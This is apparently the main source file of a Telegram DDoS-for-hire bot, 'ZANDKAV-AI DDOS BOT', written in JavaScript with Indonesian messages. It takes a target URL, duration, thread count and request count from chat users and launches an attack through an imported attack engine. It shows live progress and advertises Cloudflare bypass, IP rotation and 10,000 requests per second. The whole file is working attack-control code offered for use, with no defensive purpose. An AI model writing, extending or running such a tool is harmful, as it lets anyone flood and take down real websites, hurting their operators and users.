// bot.js - Main Telegram Bot with Full Customization
const TelegramBot = require('node-telegram-bot-api');
const AttackEngine = require('./attack.js');
const config = require('./config.js');
const os = require('os');

// Initialize Bot
const bot = new TelegramBot(config.BOT_TOKEN, { polling: true });

// Active attacks storage
const activeAttacks = new Map();
const userCooldown = new Map();

// ============ BOT COMMANDS ============

// Start Command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const welcome = `
🔥 *ZANDKAV-AI DDOS BOT* 🔥
━━━━━━━━━━━━━━━━━━━━━
✅ *FULL CUSTOMIZATION*
✅ Threads, Duration, Requests BEBAS!

📝 *FORMAT PENGIRIMAN:*
\`link duration threads target_requests\`

🎯 *CONTOH:*
\`https://target.com 60 2000 100000\`
├─ 60 detik
├─ 2000 threads
└─ 100.000 total requests

⚡ *SIMPLE MODE:*
\`https://target.com 60\`
(otomatis threads=1000, requests unlimited)

⏱️ *UNLIMITED MODE:*
\`https://target.com 0 5000\`
(durasi & requests unlimited)

📌 *COMMANDS:*
/stop - Hentikan attack
/status - Cek attack aktif
/stats - Statistik bot
/help - Bantuan lengkap
    `;
    
    bot.sendMessage(chatId, welcome, { 
        parse_mode: 'Markdown',
        disable_web_page_preview: true 
    });
});

// Help Command
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    const help = `
📚 *PANDUAN LENGKAP*
━━━━━━━━━━━━━━━━━━━━━

🎯 *FORMAT 1: Default*
\`https://target.com 60\`
├─ Durasi: 60 detik
├─ Threads: 1000 (default)
├─ Requests: Unlimited
└─ RPS Target: 10,000

🎯 *FORMAT 2: Custom Threads*
\`https://target.com 60 2000\`
├─ Durasi: 60 detik
├─ Threads: 2000
└─ Requests: Unlimited

🎯 *FORMAT 3: Full Custom*
\`https://target.com 60 2000 100000\`
├─ Durasi: 60 detik
├─ Threads: 2000
└─ Requests: 100,000

🎯 *FORMAT 4: Unlimited*
\`https://target.com 0 5000\`
├─ Durasi: UNLIMITED
├─ Threads: 5000
└─ Requests: Unlimited

⚠️ *BATASAN:*
• Durasi: 0 (unlimited) - 3600 detik
• Threads: 100 - 10000
• Requests: 0 (unlimited) - 10,000,000

⚡ *PERFORMA:*
• 10,000 RPS dengan 2000+ threads
• CloudFlare Bypass ACTIVE
• 100,000+ IP Rotation
    `;
    
    bot.sendMessage(chatId, help, { 
        parse_mode: 'Markdown',
        disable_web_page_preview: true 
    });
});

// ✅ PERBAIKAN 1: Status Command dengan safety check
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    const attack = activeAttacks.get(userId);
    
    if (attack) {
        const elapsed = ((Date.now() - attack.startTime) / 1000).toFixed(1);
        // FIX: Tambah safety check untuk stats.total
        const totalReq = (attack.engine?.stats?.total ?? 0).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
        
        bot.sendMessage(chatId, 
            `⚠️ *ATTACK AKTIF*\n\n` +
            `🎯 Target: \`${attack.target}\`\n` +
            `⏱️ Elapsed: ${elapsed}s / ${attack.duration}s\n` +
            `🧵 Threads: ${attack.threads}\n` +
            `📊 Requests: ${totalReq}\n` +
            `/stop - Hentikan attack`,
            { parse_mode: 'Markdown' }
        );
    } else {
        bot.sendMessage(chatId, `✅ Tidak ada attack aktif`);
    }
});

// ✅ PERBAIKAN 2: Stop Command dengan safety check
bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    const attack = activeAttacks.get(userId);
    
    if (attack) {
        attack.engine.stop();
        activeAttacks.delete(userId);
        
        const elapsed = ((Date.now() - attack.startTime) / 1000).toFixed(1);
        // FIX: Tambah safety check untuk stats.total
        const total = (attack.engine?.stats?.total ?? 0).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
        
        bot.sendMessage(chatId, 
            `🛑 *ATTACK DIHENTIKAN*\n\n` +
            `🎯 Target: \`${attack.target}\`\n` +
            `⏱️ Duration: ${elapsed}s\n` +
            `📊 Total Requests: ${total}\n` +
            `✅ Berhasil dihentikan!`,
            { parse_mode: 'Markdown' }
        );
    } else {
        bot.sendMessage(chatId, `❌ Tidak ada attack yang berjalan`);
    }
});

// ✅ PERBAIKAN 3: Stats Command dengan safety check
bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    
    const totalAttacks = activeAttacks.size;
    const memory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
    const cpu = os.loadavg()[0].toFixed(2);
    const uptime = (process.uptime() / 60).toFixed(1);
    
    // FIX: Hitung total requests dengan safety check
    let totalRequests = 0;
    let totalSuccess = 0;
    for (const [_, attack] of activeAttacks) {
        totalRequests += attack.engine?.stats?.total ?? 0;
        totalSuccess += attack.engine?.stats?.success ?? 0;
    }
    
    const totalReqFormatted = totalRequests.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
    const totalSuccFormatted = totalSuccess.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
    
    const stats = `
📊 *BOT STATISTICS*
━━━━━━━━━━━━━━━━━━━━━
🖥️ *SYSTEM*
├─ CPU Load: ${cpu}
├─ Memory: ${memory} MB
└─ Uptime: ${uptime} menit

⚡ *ATTACKS*
├─ Active: ${totalAttacks}
├─ Total Req: ${totalReqFormatted}
└─ Success: ${totalSuccFormatted}

🌐 *RESOURCES*
├─ IPs: 100,000+
├─ UAs: 50,000+
└─ Referers: 30,000+

🎯 *TARGET RPS: 10,000*
    `;
    
    bot.sendMessage(chatId, stats, { parse_mode: 'Markdown' });
});

// ============ MAIN ATTACK HANDLER ============
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;
    
    // Skip commands
    if (!text || text.startsWith('/')) return;
    
    // Check cooldown
    if (config.RATE_LIMIT.ENABLED) {
        const lastAttack = userCooldown.get(userId);
        if (lastAttack) {
            const timeLeft = config.RATE_LIMIT.COOLDOWN - (Date.now() - lastAttack) / 1000;
            if (timeLeft > 0) {
                return bot.sendMessage(chatId, 
                    `⏳ *COOLDOWN*\nTunggu ${Math.ceil(timeLeft)} detik`,
                    { parse_mode: 'Markdown' }
                );
            }
        }
    }
    
    // Check active attack
    if (activeAttacks.has(userId)) {
        return bot.sendMessage(chatId, 
            `⚠️ *ATTACK AKTIF*\n\n` +
            `Anda sudah memiliki attack yang berjalan!\n` +
            `Gunakan /stop untuk menghentikan`,
            { parse_mode: 'Markdown' }
        );
    }
    
    // ============ PARSE INPUT ============
    const parts = text.trim().split(/\s+/);
    
    // Format: link duration threads target_requests
    // Example: https://target.com 60 2000 100000
    
    let target = parts[0];
    let duration = 60;        // default
    let threads = 1000;      // default
    let targetRequests = 0;  // default unlimited
    
    // Parse duration
    if (parts.length >= 2) {
        duration = parseInt(parts[1]);
        if (isNaN(duration) || duration < 0) duration = 60;
        if (duration > 3600) duration = 3600;
    }
    
    // Parse threads
    if (parts.length >= 3) {
        threads = parseInt(parts[2]);
        if (isNaN(threads) || threads < 100) threads = 100;
        if (threads > 10000) threads = 10000;
    }
    
    // Parse target requests
    if (parts.length >= 4) {
        targetRequests = parseInt(parts[3]);
        if (isNaN(targetRequests) || targetRequests < 0) targetRequests = 0;
        if (targetRequests > 10000000) targetRequests = 10000000;
    }
    
    // Validate target
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        target = 'https://' + target;
    }
    
    try {
        new URL(target);
    } catch (e) {
        return bot.sendMessage(chatId, 
            `❌ *URL TIDAK VALID*\n\n` +
            `Contoh: https://target.com 60 2000 100000`,
            { parse_mode: 'Markdown' }
        );
    }
    
    // Format angka untuk ditampilkan
    const threadsFormatted = threads.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
    const targetReqFormatted = targetRequests === 0 ? 'UNLIMITED' : targetRequests.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
    
    // ============ CONFIRMATION ============
    const confirmMsg = await bot.sendMessage(chatId, 
        `⚡ *KONFIRMASI ATTACK* ⚡\n\n` +
        `🎯 *Target:* \`${target}\`\n` +
        `⏱️ *Duration:* ${duration === 0 ? 'UNLIMITED' : duration + ' detik'}\n` +
        `🧵 *Threads:* ${threadsFormatted}\n` +
        `📊 *Target Req:* ${targetReqFormatted}\n` +
        `🔥 *Target RPS:* 10,000\n\n` +
        `✅ *CloudFlare Bypass:* ACTIVE\n` +
        `🌐 *IP Pool:* 100,000+\n\n` +
        `_Ketik /start dalam 10 detik untuk BATAL_`,
        { parse_mode: 'Markdown' }
    );
    
    // Wait 10 seconds for cancel
    let isCancelled = false;
    const cancelHandler = (cancelMsg) => {
        if (cancelMsg.text === '/start' && cancelMsg.from.id === userId) {
            isCancelled = true;
            bot.sendMessage(chatId, `❌ Attack dibatalkan!`);
        }
    };
    
    bot.on('message', cancelHandler);
    await new Promise(resolve => setTimeout(resolve, 10000));
    bot.removeListener('message', cancelHandler);
    
    if (isCancelled) return;
    
    // ============ START ATTACK ============
    const startMsg = await bot.sendMessage(chatId, 
        `⚡ *ATTACK STARTED!* ⚡\n\n` +
        `[${'█'.repeat(10)}${'░'.repeat(40)}] 0%\n\n` +
        `🎯 *Target:* \`${target}\`\n` +
        `⏱️ *Duration:* ${duration === 0 ? 'UNLIMITED' : duration + 's'}\n` +
        `🧵 *Threads:* ${threadsFormatted}\n` +
        `📊 *Target:* ${targetReqFormatted}\n` +
        `📈 *Requests:* 0\n` +
        `✅ *Success:* 0 (0%)\n` +
        `🛡️ *CF Bypass:* 0 (0%)\n` +
        `⚡ *RPS:* 0\n\n` +
        `_Attack sedang berjalan..._`,
        { parse_mode: 'Markdown' }
    );
    
    // Initialize attack engine
    const attackEngine = new AttackEngine();
    
    // Save to active attacks
    activeAttacks.set(userId, { 
        engine: attackEngine, 
        target: target,
        duration: duration,
        threads: threads,
        targetRequests: targetRequests,
        startTime: Date.now() 
    });
    
    // Set cooldown
    userCooldown.set(userId, Date.now());
    
    // ============ STATUS UPDATE CALLBACK ============
    const statusCallback = (stats) => {
        const attack = activeAttacks.get(userId);
        if (!attack) return;
        
        // ✅ FIX: Safety check untuk stats object
        stats = stats || {};
        const elapsed = stats.elapsed || 0;
        const total = stats.total || 0;
        const success = stats.success || 0;
        const cfBypass = stats.cfBypassed || 0;
        const rps = stats.rps || 0;
        
        const successRate = total > 0 ? ((success / total) * 100).toFixed(1) : 0;
        const cfRate = total > 0 ? ((cfBypass / total) * 100).toFixed(1) : 0;
        
        // Format angka
        const totalFormatted = total.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
        const successFormatted = success.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
        const cfFormatted = cfBypass.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
        const rpsFormatted = rps.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
        
        // Progress bar
        let progress = 0;
        if (duration > 0) {
            progress = Math.min(100, (elapsed / duration) * 100);
        } else if (targetRequests > 0) {
            progress = Math.min(100, (total / targetRequests) * 100);
        }
        
        const filled = Math.floor(progress / 2);
        const bar = '█'.repeat(filled) + '░'.repeat(50 - filled);
        
        // Check if attack should stop
        let shouldStop = false;
        let stopReason = '';
        
        if (duration > 0 && elapsed >= duration) {
            shouldStop = true;
            stopReason = 'DURATION LIMIT REACHED';
        }
        
        if (targetRequests > 0 && total >= targetRequests) {
            shouldStop = true;
            stopReason = 'REQUEST LIMIT REACHED';
        }
        
        if (shouldStop) {
            // Stop attack
            attackEngine.stop();
            activeAttacks.delete(userId);
            
            // Hitung average RPS
            const avgRPS = elapsed > 0 ? Math.round(total / elapsed) : 0;
            const avgRPSFormatted = avgRPS.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
            
            // Final message
            bot.editMessageText(
                `✅ *ATTACK COMPLETED!* ✅\n\n` +
                `[${'█'.repeat(50)}] 100%\n\n` +
                `🎯 *Target:* \`${target}\`\n` +
                `⏱️ *Duration:* ${parseFloat(elapsed).toFixed(1)}s\n` +
                `🧵 *Threads:* ${threadsFormatted}\n` +
                `📊 *Total Req:* ${totalFormatted}\n` +
                `✅ *Success:* ${successFormatted} (${successRate}%)\n` +
                `🛡️ *CF Bypass:* ${cfFormatted} (${cfRate}%)\n` +
                `⚡ *Avg RPS:* ${avgRPSFormatted}\n\n` +
                `🔥 *10K RPS:* ${avgRPS >= 10000 ? '✅ ACHIEVED' : '❌ NOT ACHIEVED'}\n` +
                `🛑 *Reason:* ${stopReason}`,
                {
                    chat_id: chatId,
                    message_id: startMsg.message_id,
                    parse_mode: 'Markdown'
                }
            ).catch(() => {});
            
            return;
        }
        
        // Live update
        bot.editMessageText(
            `⚡ *ATTACK RUNNING* ⚡\n\n` +
            `[${bar}] ${progress.toFixed(1)}%\n\n` +
            `🎯 *Target:* \`${target}\`\n` +
            `⏱️ *Time:* ${parseFloat(elapsed).toFixed(1)}s / ${duration === 0 ? '∞' : duration + 's'}\n` +
            `🧵 *Threads:* ${threadsFormatted}\n` +
            `📊 *Requests:* ${totalFormatted}\n` +
            `✅ *Success:* ${successFormatted} (${successRate}%)\n` +
            `🛡️ *CF Bypass:* ${cfFormatted} (${cfRate}%)\n` +
            `⚡ *RPS:* ${rpsFormatted}\n\n` +
            `🔥 *Target RPS:* 10,000\n` +
            `🛑 /stop - Hentikan attack`,
            {
                chat_id: chatId,
                message_id: startMsg.message_id,
                parse_mode: 'Markdown'
            }
        ).catch(() => {});
    };
    
    // Start the attack
    attackEngine.start(
        target, 
        threads, 
        duration, 
        targetRequests,
        statusCallback
    );
});

// ============ ERROR HANDLER ============
bot.on('polling_error', (error) => {
    console.log('Polling error:', error.message);
});

// ============ START BOT ============
console.log(`
╔══════════════════════════════════════════════════╗
║     ZANDKAV-AI TELEGRAM DDOS BOT                ║
║     ⚡ FULL CUSTOMIZATION ⚡                    ║
╠══════════════════════════════════════════════════╣
║  Status: ONLINE                                 ║
║  Features:                                      ║
║  • Custom Threads: 100-10000                   ║
║  • Custom Duration: 0-3600s                   ║
║  • Custom Requests: 0-10,000,000              ║
║  • CloudFlare Bypass: ACTIVE                   ║
║  • IP Pool: 100,000+                           ║
╚══════════════════════════════════════════════════╝
`);

console.log(`[+] Bot started! @${config.BOT_TOKEN.split(':')[0]}`);
